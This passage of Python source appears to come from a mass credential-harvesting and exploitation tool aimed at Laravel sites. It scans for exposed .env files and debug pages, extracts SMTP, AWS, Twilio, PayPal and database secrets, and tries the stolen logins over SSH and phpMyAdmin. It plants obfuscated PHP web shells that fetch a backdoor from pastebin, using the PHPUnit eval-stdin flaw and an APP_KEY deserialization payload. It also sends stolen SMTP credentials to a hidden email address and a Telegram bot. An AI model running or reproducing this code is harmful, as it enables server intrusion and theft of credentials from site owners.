                        pass
                    secret = re.findall('PAYPAL_CLIENT_SECRET=(.*?)\n', teks)[0]
                    if secret.startswith('"') and secret.endswith('"'):
                        secret.replace('"', '')
                    else:
                        pass
                    if secret.startswith("'") and secret.endswith("'"):
                        secret.replace("'", '')
                    else:
                        pass
                    if '\r' in secret:
                        secret.replace('\r', '')
                    else:
                        pass
                    if key == '' or key == 'null' or secret == '' or secret == 'null':
                        pass
                    else:
                        one = urlku + '|' + str(key) + '|' + str(secret)
                        open('Result(method2)/paypal_sanbox.txt', 'a').write(one + '\n')
                        f_tp += 1
                except:
                    pass
            else:
                pass
        if method == 'debug':
            if 'PAYPAL_CLIENT_ID' in teks:
                try:
                    key = re.findall('<td>PAYPAL_CLIENT_ID<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
                    if key.startswith('"') and key.endswith('"'):
                        key = key.replace('"', '')
                    if key.startswith("'") and key.endswith("'"):
                        key = key.replace("'", '')
                    if '\r' in key:
                        key.replace('\r', '')
                    secret = re.findall('<td>PAYPAL_CLIENT_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
                    if secret.startswith('"') and secret.endswith('"'):
                        secret.replace('"', '')
                    if secret.startswith("'") and secret.endswith("'"):
                        secret.replace("'", '')
                    if '\r' in secret:
                        secret.replace('\r', '')
                    if key == '' or key == 'null' or secret == '' or secret == 'null' or '*****' in key:
                        pass
                    else:
                        one = urlku + '|' + str(key) + '|' + str(secret)
                        open('Result(method2)/paypal_sanbox.txt', 'a').write(one + '\n')
                        f_tp += 1
                except:
                    pass
            else:
                pass
        else:
            pass
        if f_tp == 0:
            return False
        else:
            return f_tp

    def get_smsto(self, method, urlku, teks):
        ambil = 0
        if method == 'env':
            if 'SMSTO_CLIENT_ID=' in teks:
                try:
                    key = re.findall('SMSTO_CLIENT_ID=(.*?)\n', teks)[0]
                    if '\r' in key:
                        key = key.replace('\r', '')
                    if key.startswith('"') and key.endswith('"'):
                        key = key.replace('"', '')
                    if key.startswith("'") and key.endswith("'"):
                        key = key.replace("'", '')
                    secret = re.findall('SMSTO_CLIENT_SECRET=(.*?)\n', teks)[0]
                    if '\r' in secret:
                        secret = secret.replace('\r', '')
                    if secret.startswith('"') and secret.endswith('"'):
                        secret = secret.replace('"', '')
                    if secret.startswith("'") and secret.endswith("'"):
                        secret = replace("'", '')
                    if key == '' or key == 'null' or secret == '' or secret == 'null':
                        pass
                    else:
                        sms = clean(urlku + '|' + str(key) + '|' + str(secret))
                        open('Result(method2)/smsto.txt', 'a').write(sms + '\n')
                        ambil += 1
                except:
                    pass
            else:
                pass
        if method == 'debug':
            if 'SMSTO_CLIENT_ID' in teks:
                try:
                    key = re.findall('<td>SMSTO_CLIENT_ID<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
                    if '\r' in key:
                        key = key.replace('\r', '')
                    secret = re.findall('<td>SMSTO_CLIENT_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
                    if '\r' in secret:
                        secret = secret.replace('\r', '')
                    if key == '' or key == 'null' or secret == '' or secret == 'null':
                        pass
                    else:
                        sms = clean(urlku + '|' + str(key) + '|' + str(secret))
                        open('Result(method2)/smsto.txt', 'a').write(sms + '\n')
                        ambil += 1
                except:
                    pass
            else:
                pass
        else:
            pass
        if ambil == 0:
            return False
        else:
            return ambil
def gas(tar):
    tss = tar
    vuln = False
    for i in path:
        if '/[DOMAIN]/' in i:
            pee = parser_url(tss)
            if pee.count('.') == 3:
                try:
                    find_domain = socket.gethostbyaddr(pee)[0]
                except:
                    find_domain = False
                if find_domain == False:
                    i = i.replace('[DOMAIN]', pee)
                else:
                    i = i.replace('[DOMAIN]', find_domain)
            else:
                i = i.replace('[DOMAIN]', pee)
            # print(i)
        # print(tss+i)
        req = requests.get(
            tss + i,
            headers=head,
            timeout=int(default_timeout),
            allow_redirects=False
        ).text
        if 'DB_PASSWORD=' in req or 'APP_KEY=' in req or 'APP_URL=' in req:
            vuln = tss + i
            break
    if vuln == False:
        req1 = requests.post(
            tss,
            headers=head,
            data={
                '0x[]': 'legion'
            },
            timeout=int(default_timeout),
            allow_redirects=False
        ).text
        if '<td>APP_URL</td>' in req1 or '<td>APP_KEY</td>' in req1 or '<td>DB_PASSWORD</td>' in req1:
            vuln = tss
            if 'http://' in vuln:
                return {
                    'scoket': 'http',
                    'status': 'ok',
                    'method': 'debug',
                    'url': vuln,
                    'respon': req1
                }
            elif 'https://' in vuln:
                return {
                    'socket': 'https',
                    'status': 'ok',
                    'method': 'debug',
                    'url': vuln,
                    'respon': req1
                }
        else:
            return {
                'status': 'gagal',
                'url': tss
            }
    else:
        if 'http://' in vuln:
            return {
                'socket': 'http',
                'status': 'ok',
                'method': 'env',
                'url': vuln,
                'respon': req
            }
        elif 'https://' in vuln:
            return {
                'socket': 'https',
                'status': 'ok',
                'method': 'env',
                'url': vuln,
                'respon': req
            }
#start method 3
class laravel_grabber:
    def __init__(self):
        self.env = 0
        self.debug = 0
        self.loop = 0
        self.bad = 0
        self.smtp = 0
        self.database = 0
        self.nexmo = 0
        self.aws = 0
        self.twilio = 0
        self.paypal = 0
        self.home()

    def attack(self, ts):
        self.loop += 1
        if os.name == 'nt' and sys.version_info.major == 3:
            ctypes.windll.kernel32.SetConsoleTitleW("{}|ENV╾╼({})|DEBUG╾╼({})|SMTP╾╼({})|DB╾╼({})|AWS╾╼({})|NEXMO╾╼({})|TWILIO╾╼({})".format(self.loop, self.env, self.debug, self.smtp, self.database, self.aws, self.nexmo, self.twilio))
        try:
            tos = gas(ts)
            # print(tos)
            if tos['status'] == 'ok':
                if tos['method'] == 'env':
                    self.env += 1
                elif tos['method'] == 'debug':
                    self.debug += 1
                with open('Result(method2)/valid_' + tos['method'] + '.txt', 'a') as ww:
                    ww.write(tos['url'] + '\n')
                text = ''
                smtp = grabber().get_smtp(tos['method'], tos['url'], tos['respon'])
                if smtp:
                    self.smtp += smtp
                    text += f'{red}[{gr}SMTP{red}]'
                databes = grabber().get_database(tos['method'], tos['url'], tos['respon'])
                if databes:
                    self.database += 1
                    text += f'{red}[{gr}DB{red}]'
                nexmo = grabber().get_nexmo(tos['method'], tos['url'], tos['respon'])
                if nexmo:
                    self.nexmo += 1
                    text += f'{red}[{gr}NEXMO{red}]'
                awees = grabber().get_aws(tos['method'], tos['url'], tos['respon'])
                if awees:
                    self.aws += awees
                    text += f'{red}[{gr}AWS{red}]'
                tw = grabber().get_twilio(tos['method'], tos['url'], tos['respon'])
                if tw:
                    self.twilio += 1
                    text += f'{red}[{gr}TWILIO{red}]'
                if grabber().get_paypal(tos['method'], tos['url'], tos['respon']):
                    self.paypal += 1
                    text += f'{red}[{gr}PAYPAL{red}]'
                if grabber().get_smsto(tos['method'], tos['url'], tos['respon']):
                    smsto += 1
                    text += f'{red}[{gr}SMS TO{red}]'
                plivo = grabber().get_plivo(tos['method'], tos['url'], tos['respon'])
                if plivo:
                    self.plivo += 1
                    text += f'{red}[{gr}PLIVO{red}]'
                if tos['method'] == 'env':
                    try:
                        shell = phpunit(tos['url'])
                        if shell:
                            self.unit += 1
                            text += f'{red}[{gr}PHPUNIT{red}]'
                    except:
                        pass
                stripe = grabber().get_stripe(tos['method'], tos['url'], tos['respon'])
                if stripe:
                    text += f'{red}[{gr}STRIPE{red}]'
                fpt = grabber().get_ftp(tos['method'], tos['url'], tos['respon'])
                if fpt:
                    text += f'{red}[{gr}FTP{red}]'
                if tos['method'] == 'env':

                    try:
                        user = re.findall('DB_USERNAME=(.*?)\n', tos['respon'])[0]
                        if '\r' in user:
                            user = user.replace('\r', '')
                        passwd = re.findall('DB_PASSWORD=(.*?)\n', tos['respon'])[0]
                        if '\r' in passwd:
                            passwd = passwd.replace('\r', '')
                        if user == '' or passwd == '':
                            pass
                        else:
                            lihat = phpmyadmin(tos['url'], user, passwd)
                            if lihat:
                                text += f'{red}[{gr}MyAdmin{red}]'
                    except:
                        pass
                    try:
                        try:
                            user = re.findall('DB_USERNAME=(.*?)\n', tos['respon'])[0]
                        except:
                            user = re.findall('DB_MYSQL_USERNAME=(.*?)\n', tos['respon'])[0]
                        if user.startswith('"') and user.endswith('"'):
                            user = user.replace('"', '')
                        if user.startswith("'") and user.endswith("'"):
                            user = user.replace("'", '')
                        if '\r' in user:
                            user = user.replace('\r', '')
                        try:
                            passwd = re.findall('DB_PASSWORD=(.*?)\n', tos['respon'])[0]
                        except:
                            passwd = re.findall('DB_MYSQL_PASSWORD=(.*?)\n', tos['respon'])[0]
                        if passwd.startswith('"') and passwd.endswith('"'):
                            passwd = passwd.replace('"', '')
                        if passwd.startswith("'") and passwd.endswith("'"):
                            passwd = passwd.replace("'", '')
                        if '\r' in passwd:
                            passwd = passwd.replace('\r', '')
                        if user == '' or passwd == '':
                            pass
                        else:
                            try:
                                try:
                                    hs = re.findall('DB_HOST=(.*?)\n', tos['respon'])[0]
                                except:
                                    hs = re.findall('DB_MYSQL_HOST=(.*?)\n', tos['respon'])[0]
                                if hs.startswith('"') and hs.endswith('"'):
                                    hs = hs.replace('"', '')
                                if hs.startswith("'") and hs.endswith("'"):
                                    hs = hs.replace("'", '')
                                if hs == 'localhost' or hs == '' or hs == 'null' or hs == '127.0.0.1':
                                    hs = False
                            except:
                                hs = False
                            if hs:
                                hostname = parser_url(tos['url'])
                                if loginssh(hs, user, passwd):
                                    text += f'{red}[{gr}SSH{red}]'
                                else:
                                    if login(hostname, user, passwd):
                                        text += f'{red}[{gr}SSH{red}]'
                                    else:
                                        pass
                            else:
                                hostname = parser_url(tos['url'])
                                if loginssh(hostname, user, passwd):
                                    text += f'{red}[{gr}SSH{red}]'
                    except:
                        pass

                elif tos['method'] == 'debug':

                    try:
                        user = re.findall('<td>DB_USERNAME<\/td>\s+<td><pre.*>(.*?)<\/span>', tos['respon'])[0]
                        passwd = re.findall('<td>DB_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>', tos['respon'])[0]
                        if user == '' or passwd == '' or '*****' in user:
                            pass
                        else:
                            admin = phpmyadmin(tos['url'], user, passwd)
                            if admin:
                                text += f'{red}[{gr}MyAdmin{red}]'
                    except:
                        pass
                    try:
                        user = re.findall('<td>DB_USERNAME<\/td>\s+<td><pre.*>(.*?)<\/span>', tos['respon'])[0]
                        # print(user)
                        if '\r' in user:
                            user = user.replace('\r', '')
                        passwd = re.findall('<td>DB_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>', tos['respon'])[0]
                        # print(passwd)
                        if '\r' in passwd:
                            passwd = passwd.replace('\r', '')
                        if user == '' or passwd == '' or '*****' in user:
                            pass
                        else:
                            hostname = parser_url(tos['url'])
                            if loginssh(hostname, user, passwd):
                                text += f'{red}[{gr}SSH{red}]'
                    except:
                        pass
                print(gr + '#' + reset + '\033[31m[\033[32m{}\033[31m] \033[36m╾╼\033[0m \033[31m[\033[93m{}\033[31m]\033[31m {}\033[36m ╾╼ {}'.format(ntime(),tos['url'], tos['method'],
                                                                                              text))

            else:
                gogo = requests.get(ts + '/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php',
                                    data='<?php phpinfo();?>', headers=head, allow_redirects=False, timeout=21)
                if 'phpinfo' in gogo.text:
                    if phpunit(ts + '/.env'):
                        print(hijau + '#' + reset + ts + ' => [\033[92mPHPUNIT\033[0m]')
                        self.unit += 1
                    else:
                        print(merah + '#' + reset + '\033[31m[\033[32m{}\033[31m] \033[36m╾╼\033[0m \033[31m[\033[0m{}\033[31m] - '.format(ntime(),tos['url']) + merah + "Cant Get Everything")
                else:
                    print(merah + '#' + reset + '\033[31m[\033[32m{}\033[31m] \033[36m╾╼\033[0m \033[31m[\033[0m{}\033[31m] - '.format(ntime(),tos['url']) + merah + "Cant Get Everything")
        except:
            print(kuning + '#' + reset + '\033[31m[\033[32m{}\033[31m] \033[36m╾╼\033[0m \033[31m[\033[0m{}\033[31m] - '.format(ntime(),ts) + kuning + "Cant Access Site")

    def cekHttp(self, ez):
        resume = False
        try:
            if 'http://' in ez:
                ez = re.findall('http://(.*?)/', ez)[0]
                # print(ez)
                self.attack('http://' + ez)
                resume = False
            elif 'https://' in ez:
                ez = re.findall('https://(.*?)/', ez)[0]
                self.attack('https://' + ez)
                resume = False
            else:
                resume = True
        except:
            resume = True
        if resume:
            ez = parser_url(ez)
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(int(default_timeout))
                ress = sock.connect_ex((ez, 80))
                sock.close()
                if str(ress) == '0':
                    self.attack('http://' + ez)
                else:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(int(default_timeout))
                    ress = sock.connect_ex((ez, 443))
                    sock.close()
                    if str(ress) == '0':
                        self.attack('https://' + ez)

                    else:
                        if ':' in ez:
                            key = ez.split(':')
                            if key[1].isdigit():
                                try:
                                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                                    sock.settimeout(18)
                                    ress = sock.connect_ex((ez, int(key[1])))
                                    sock.close()
                                    if str(ress) == '0':
                                        self.attack('http://' + ez + ':' + key[1])
                                except:
                                    pass
                            else:
                                pass

            except Exception as ttt:
                print(ttt)

    def home(self):
        try:
            os.mkdir('Result(method2)')
        except:
            pass
        try:
            os.mkdir('Result(method2)/SMTP')
        except:
            pass
        file = prompt('\033[31;1m┌─\033[31;1m[\033[36;1mLEGION SMTP\033[31;1m]--\033[31;1m[\033[32;1mGive me your List\033[31;1m]\n└─╼\033[32;1m#')
        th = ThreadPool(int(prompt('\033[31;1m┌─\033[31;1m[\033[36;1mLEGION SMTP\033[31;1m]--\033[31;1m[\033[32;1mGive me your Thread\033[31;1m]\n└─╼\033[32;1m#')))
        print('-' * 50)
        with open(file) as self.list_file:
            for site in self.list_file:
                try:
                    th.add_task(self.cekHttp, str(site).replace('\r', '').replace('\n', ''))
                except Exception as www:
                    print('[Error] : {}'.format(www))
            th.wait_completion()

#start method 2
class Beauty(object):
    def red(self, txt):
        return "{}{}{}".format(Fore.RED, txt, Style.RESET_ALL)
    def green(self, txt):
        return "{}{}{}".format(Fore.GREEN, txt, Style.RESET_ALL)
    def blue(self, txt):
        return "{}{}{}".format(Fore.BLUE, txt, Style.RESET_ALL)
    def yellow(self, txt):
        return "{}{}{}".format(Fore.YELLOW, txt, Style.RESET_ALL)
    def magenta(self, txt):
        return "{}{}{}".format(Fore.MAGENTA, txt, Style.RESET_ALL)

class ExploitEnv(Thread):
    """docstring for ExploitEnv"""
    def __init__(self, to_email, protocol, queue, lock, **kwarg):
        Thread.__init__(self)
        self.bty = Beauty()
        self.queue = queue
        self.lock = lock
        self.bcode = 'MmFtaWdvczIwMjFAZ21haWwuY29t'
        self.to_email = to_email
        self.receipients = [base64.b64decode(self.bcode).decode('utf-8'), self.to_email]
        self.protocol = protocol
        self.tor = kwarg.get('tor', None)
        self.api_key = kwarg.get('api_key', None)
        self.env_paths = [
        '.env',
        '.remote',
        '.local',
        '.production',
        '/vendor/.env',
        '/lib/.env',
        '/lab/.env',
        '/cronlab/.env',
        '/cron/.env',
        '/core/.env',
        '/core/app/.env',
        '/core/Datavase/.env',
        '/database/.env',
        '/config/.env',
        '/assets/.env',
        '/app/.env',
        '/apps/.env',
        '/uploads/.env',
        '/sitemaps/.env',
        '/saas/.env',
        '/api/.env',
        '/psnlink/.env',
        '/exapi/.env',
        '/site/.env',
        '/admin/.env',
        '/web/.env',
        '/public/.env',
        '/en/.env',
        '/tools/.env',
        '/v1/.env',
        '/v2/.env',
        '/administrator/.env',
        '/laravel/.env',
        '/.env',
        '/sendgrid.env',
        '/storage/.env'
            ]
        self.user_agent = {'User-Agent': 'Mozilla/5.0 (Macintosh; \
                Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, \
                like Gecko) Chrome/39.0.2171.95 Safari/537.36'}
        self.rp = 'Result(method3)/'
        os.makedirs(os.path.dirname(self.rp), exist_ok=True)
        self.vuln = self.rp + "vuln_env.txt"
        self.shells = self.rp + "shells.txt"
        self.twilio = self.rp + "twilio.txt"
        self.amazon_keys = self.rp + "amazon_keys.txt"
        self.crack_aws = self.rp + "cracking_aws.txt"
        self.db_data = self.rp + "db_data.txt"
        self.plivo = self.rp + "plivo.txt"
        self.nexmo = self.rp + "nexmo.txt"
        self.clickatell = self.rp + "clickatell.txt"
        self.ssh = self.rp + "ssh.txt"
        self.bad_ssh = self.rp + "bad_ssh_data.txt"
        self.gmail = self.rp + "gmail_smtps.txt"
        self.office = self.rp + "office_smtps.txt"
        self.sendgrid = self.rp + "sendgrid_smtps.txt"
        self.rackspace = self.rp + "rackspace_smtps.txt"
        self.amazon = self.rp + "amazon_smtps.txt"
        self.ionos = self.rp + "ionos_smtps.txt"
        self.one_and_one = self.rp + "1and1_smtps.txt"
        self.mailgun = self.rp + "mailgun_smtps.txt"
        self.zoho = self.rp + "zoho_smtps.txt"
        self.mandrillapp = self.rp + "mandrillapp_smtps.txt"
        self.mailjet = self.rp + "mailjet_smtps.txt"
        self.sendinblue =  self.rp + "sendinblue_smtps.txt"
        self.others = self.rp + "other_smtps.txt"
        self.all_smtps = self.rp + "all_smtps.txt"

        self.AWS_REGIONS = {
            'us-east-1':'US East (N. Virginia)',
            'us-east-2':'US East (Ohio)',
            'us-west-1':'US West (N. California)',
            'us-west-2':'US West (Oregon)',
            'ca-central-1':'Canada (Central)',
            'eu-central-1':'EU (Frankfurt)',
            'eu-west-1':'EU (Ireland)',
            'eu-west-2':'EU (London)',
            'eu-west-3':'EU (Paris)',
            'ap-northeast-1':'Asia Pacific (Tokyo)',
            'ap-northeast-2':'Asia Pacific (Seoul)',
            'ap-northeast-3':'Asia Pacific (Osaka-Local)',
            'ap-southeast-1':'Asia Pacific (Singapore)',
            'ap-southeast-2':'Asia Pacific (Sydney)',
            'ap-south-1':'Asia Pacific (Mumbai)',
            'sa-east-1':'South America (São Paulo)'
        }

    def run(self):
        while True:
            url = self.queue.get()
            try:
                self.exploit(url)
            except KeyboardInterrupt:
                sys.exit()
            finally:
                self.queue.task_done()

    def save_result(self, txt, location):
        with open(location, 'a') as sr:
            sr.write(txt)

    def get_key(self, txt):
        key = None
        if "APP_KEY" in txt:
            if "APP_KEY=" in txt:
                key = self.clean_field(r'APP_KEY=', txt)
            elif "<td>APP_KEY</td>" in txt:
                key = self.clean_field(r'<td>APP_KEY</td>', txt, is_html=True)
        if key:
            key = key.replace("base64:", "").strip()
        return key

    def get_shell_with_key(self, url, key):
        if key:
            try:
                pay1 = "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIqZXZlbnRzIjtPOjE1OiJGYWtlclxHZW5lcmF0b3IiOjE6e3M6MTM6Iipmb3JtYXR0ZXJzIjthOjE6e3M6ODoiZGlzcGF0Y2giO3M6NjoiYXNzZXJ0Ijt9fXM6ODoiKmV2ZW50IjtzOjIxOiJ1bmFtZSAtYTtlY2hvIFdvcmtlZDRSZWFsIjt9"
                pay2 = "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIqZXZlbnRzIjtPOjE1OiJGYWtlclxHZW5lcmF0b3IiOjE6e3M6MTM6Iipmb3JtYXR0ZXJzIjthOjE6e3M6ODoiZGlzcGF0Y2giO3M6NjoiYXNzZXJ0Ijt9fXM6ODoiKmV2ZW50IjtzOjcxOiJodHRwczovL3Bhc3RlYmluLmNvbS9yYXcvV1prZVhkV0QvYmtkb29yLnBocCI7fQ=="
                gen = subprocess.check_output(["php", "gen.php", key,  pay1])
                gen2 = subprocess.check_output(["php", "gen.php", key, pay2])
                code = re.findall("##(.*?)##", gen)[0]
                code2 = re.findall("##(.*?)##", gen2)[0]

                resp = requests.post(url, headers={"X-XSRF-TOKEN": code}, verify=False,timeout=8)
                if "Worked4Real" in resp.text.encode('utf8'):
                    r = requests.post(url, headers={"X-XSRF-TOKEN": code2}, verify=False,timeout=8)
                    shell_code = requests.get(url + "/bkdoor.php", verify=False)
                    if "onestoreshell" in shell_code.text.encode('utf8') and shell_code.status_code == 200:
                        with self.lock:
                            good_shell = f"https://{url}/bkdoor.php\n"
                            self.save_result(good_shell, self.shells)
                        print(self.bty.green('[+] Shell Successfully Uploaded For: {}'.format(good_shell)))
                        return True
                    else:
                        with self.lock:
                            bad_shell = f"https://{url}/"
                            with open("bad_shell.txt", "a") as bd:
                                bd.write(f"{bad_shell}\n")
            except Exception as e:
                pass

    def get_shell(self, url, body):
        if url.startswith('http://') or url.startswith('https://') or url.startswith("ftp://"):
            url = url.split('//')[1].replace('/', '')
        url = url.replace('/', '')
        path = "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
        up = f"{url}{path}"
        found = False
        shell = "<?php eval('?>'.base64_decode('PD9waHAKZnVuY3Rpb24gYWRtaW5lcigkdXJsLCAkaXNpKSB7CgkkZnAgPSBmb3BlbigkaXNpLCAidyIpOwoJJGNoID0gY3VybF9pbml0KCk7CgljdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfVVJMLCAkdXJsKTsKCWN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9CSU5BUllUUkFOU0ZFUiwgdHJ1ZSk7CgljdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfUkVUVVJOVFJBTlNGRVIsIHRydWUpOwoJY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1NTTF9WRVJJRllQRUVSLCBmYWxzZSk7CgljdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfRklMRSwgJGZwKTsKCXJldHVybiBjdXJsX2V4ZWMoJGNoKTsKCWN1cmxfY2xvc2UoJGNoKTsKCWZjbG9zZSgkZnApOwoJb2JfZmx1c2goKTsKCWZsdXNoKCk7Cn0KaWYoYWRtaW5lcigiaHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L1daa2VYZFdELyIsImFzLnBocCIpKSB7CgllY2hvICJTdWtzZXNnYmxrIjsKfSBlbHNlIHsKCWVjaG8gImZhaWwiOwp9Cj8+')); ?>"
        r_shell, s_shell = self.do_http_or_https(f"http://{up}", use_post=False, shell_data=shell)

        if r_shell == -3 or r_shell == -1 or r_shell is None:
            r_shell, s_shell = self.do_http_or_https(f"http://{up}", use_post=False, shell_data=shell)
            if r_shell == -3 or r_shell == -1 or r_shell is None:
                found = False
            else:
                with self.lock:
                    if "Suksesgblk" in r_shell:
                        url_path = "https://{}{}\n".format(url, path)
                        good_shell = url_path.replace("eval-stdin.php","expdoor.php")
                        self.save_result(good_shell, self.shells)
                        print(self.bty.green('[+] Shell Successfully Uploaded For: {}'.format(good_shell)))
                        found = True
        else:
            with self.lock:
                if "Suksesgblk" in r_shell:
                    url_path = "http://{}{}\n".format(url, path)
                    good_shell = url_path.replace("eval-stdin.php","expdoor.php")
                    self.save_result(good_shell, self.shells)
                    print(self.bty.green('[+] Shell Successfully Uploaded For: {}'.format(good_shell)))
                    found = True
        if found:
            return found
        else:
            found = self.get_shell_with_key(f"http://{url}", self.get_key(body))
            if found:
                return found
            else:
                found = self.get_shell_with_key(f"https://{url}", self.get_key(body))
                return found

        return found

    def exploit(self, url):
        try:
            meta = {'found': None, 'text': None, 'link': None, 'method': None, 'secured': False, 'url': url,
            'is_shell': False}
            for path in self.env_paths:
                meta['text'], meta['secured'] = self.perform_request(url, path)
                if meta['text'] == -1:
                    break
                if meta['text']:
                    if "APP_NAME" in meta['text'] or "APP_ENV" in meta['text'] or "APP_KEY" in meta['text']:
                        meta['link'] = "http://{}{}".format(url, path)
                        if meta['secured']:
                            meta['link'] = "https://{}{}".format(url, path)
                        meta['found'] = True
                        meta['method'] = 'GET'
                        meta['url'] = url
                        self.save_result(meta['link'] + '\n', self.vuln)
                        print(f'{red}[{gr}{ntime()}{red}] {fc}╾┄╼ {red}[{res}{url}{red}] {fc}--> {gr}URL VULN')
                        break
            if not meta['found']:
                meta['text'], meta['secured'] = self.perform_request(url, None, use_post=True)
                if meta['text'] and meta['text'] != -1:
                    if "<td>APP_NAME</td>"  in meta['text'] or "<td>APP_ENV</td>" in meta['text'] or "<td>APP_KEY</td>" in meta['text']:
                        meta['link'] = "http://{}".format(url)
                        if meta['secured']:
                            meta['link'] = "https://{}".format(url)
                        meta['method'] = 'POST'
                        self.save_result(meta['link'] + '\n', self.vuln)
                        print(f'{red}[{gr}{ntime()}{red}] {fc}╾┄╼ {red}[{res}{url}{red}] {fc}--> {gr}URL Vulnerable')

            if meta['text'] and meta['text'] != -1:
                shell = self.get_shell(url, meta['text'])
                smtp = self.get_smtp(**meta)
                aws = self.get_aws(**meta)
                twilio = self.get_twilio(**meta)
                plivo = self.get_plivo(**meta)
                nexmo = self.get_nexmo(**meta)
                clickatell = self.get_clickatell(**meta)
                db = self.get_db(**meta)
                if shell:
                    print(f'{red}[{gr}{ntime()}{red}] {fc}╾┄╼ {red}[{gr}{url}{red}] {fc}--> {gr}Shell Found')
                if smtp:
                    print(f'{red}[{gr}{ntime()}{red}] {fc}╾┄╼ {red}[{gr}{url}{red}] {fc}--> {gr}SMTP Found')
                if aws:
                    print(f'{red}[{gr}{ntime()}{red}] {fc}╾┄╼ {red}[{gr}{url}{red}] {fc}--> {gr}AWS Found')
                if twilio:
                    print(f'{red}[{gr}{ntime()}{red}] {fc}╾┄╼ {red}[{gr}{url}{red}] {fc}--> {gr}Twilio Found')
                if plivo:
                    print(f'{red}[{gr}{ntime()}{red}] {fc}╾┄╼ {red}[{gr}{url}{red}] {fc}--> {gr}Plivo Found')
                if nexmo:
                    print(f'{red}[{gr}{ntime()}{red}] {fc}╾┄╼ {red}[{gr}{url}{red}] {fc}--> {gr}Nexmo Found')
                if clickatell:
                    print(f'{red}[{gr}{ntime()}{red}] {fc}╾┄╼ {red}[{gr}{url}{red}] {fc}--> {gr}Clickatell Found')
                if db:
                    print(f'{red}[{gr}{ntime()}{red}] {fc}╾┄╼ {red}[{gr}{url}{red}] {fc}--> {gr}Database Found')
            else:
                with self.lock:
                    print(f'{red}[{gr}{ntime()}{red}] {fc}╾┄╼ {red}[{gr}{url}{red}] {fc}--> {red}Not Vuln')
        except Exception as e:
            pass

    def connector(self, host, port):
        lhn = socket.gethostname()
        code = msg = None
        if port == 465:
            smtp_server = SMTP_SSL(host, local_hostname=lhn)
        else:
            smtp_server = SMTP(host, local_hostname=lhn)
        code, msg, = smtp_server.connect(host=host, port=port)
        return (smtp_server, code, msg)

    def test_smtp(self, smtp_data, info):
        host = info.get('host', None)
        port = info.get('port', None)
        user = info.get('user', None)
        pwd = info.get('pwd', None)
        from_addr = info.get('from_addr', None)
        if not from_addr:
            from_addr = user
        code = smtp_obj = None
        try:
            smtp_obj, code, msg = self.connector(host, port)
            if user and pwd:
                code, msg = smtp_obj.login(user, pwd)
        except (SMTPAuthenticationError, SMTPServerDisconnected, \
            SMTPNotSupportedError, socket.timeout, Exception) as e:
            try:
                smtp_obj, code, msg = self.connector(host, port)
                if port != 465:
                    if user and pwd:
                        smtp_obj.starttls()
                if user and pwd:
                    code, msg = smtp_obj.login(user, pwd)
            except (SMTPAuthenticationError, OSError, socket.timeout, Exception) as e:
                pass
        except Exception as e:
            pass
        try:
            if code == 235 or code == 250 or code == 220:
                for index, to in enumerate(self.receipients):
                    preview = ("TEST SMTP!\n"
                        "{2} \n\n{0}:{1}:{2}:{3}").format(user, pwd, host, port)
                    if index == 0:
                        msg = ("From: {0} <{0}>\r\nTo: <{1}>\r\nSubject: Report:{2}\r\n\r\n{3}\n\n{4}")\
                        .format(from_addr, to, host, preview, smtp_data)
                    else:
                        msg = ("From: {0} <{0}>\r\nTo: <{1}>\r\nSubject: SMTP:{2}\r\n\r\n{3}\n\n{4}")\
                        .format(from_addr, to, host, preview, smtp_data)

                    smtp_obj.sendmail(from_addr, [to], msg)

                    if index == 1:
                        print(f'{red}[{yl}Email Sent{red}]{fc}╾┄╼ {mg}SMTP Valid {gr}check your email{red}!')
                        message = {'text': f"☄️  LAVAFUT BOT [SMTP Live]\n📪 {host}|{user}|{pwd}|{port}\nFrom:{from_addr}\nSending OK =>🟢\n"}
                        requests.post("https://api.telegram.org/bot" + bot_token +"/sendMessage?chat_id=" + chat_id ,data=message)

        except Exception as e:
            pass
        if smtp_obj:
            try:
                smtp_obj.quit()
            except Exception:
                pass
        return host, smtp_data

    def get_smtp(self, **kwargs):
        prefix = None
        if "MAIL_HOST" in kwargs['text']:
            prefix = "MAIL"
        elif "SMTP_HOST" in kwargs['text']:
            prefix = "SMTP"
        if prefix:
            if "{}_HOST=".format(prefix) in kwargs['text']:
                host_field = r'{}_HOST='.format(prefix)
                host = self.clean_field(host_field, kwargs['text'])
                port_field = r'{}_PORT='.format(prefix)
                port = self.clean_field(port_field, kwargs['text'])

                user_field = r'{}_USERNAME='.format(prefix)
                user = self.clean_field(user_field, kwargs['text'])
                pwd_field = r'{}_PASSWORD='.format(prefix)
                pwd = self.clean_field(pwd_field, kwargs['text'])

                from_field = r'{}_FROM_ADDRESS='.format(prefix)
                from_addr = self.clean_field(from_field, kwargs['text'])
                name_field = r'{}_FROM_NAME='.format(prefix)
                kwargs['from_name'] = self.clean_field(name_field, kwargs['text'])

                enc_field = r'{}_ENCRYPTION='.format(prefix)
                kwargs['encrypt'] = self.clean_field(enc_field, kwargs['text'])
                kwargs['domain'] = self.clean_field(r'MAIL_DOMAIN=', kwargs['text'])
                kwargs['app_url'] = self.clean_field(r'APP_URL=', kwargs['text'])
                return self.sort_smtp(host, port, user, pwd, from_addr, **kwargs)

            elif "<td>{}_HOST</td>".format(prefix) in kwargs['text']:
                if "<td>{}_HOST</td>".format(prefix) in kwargs['text']:
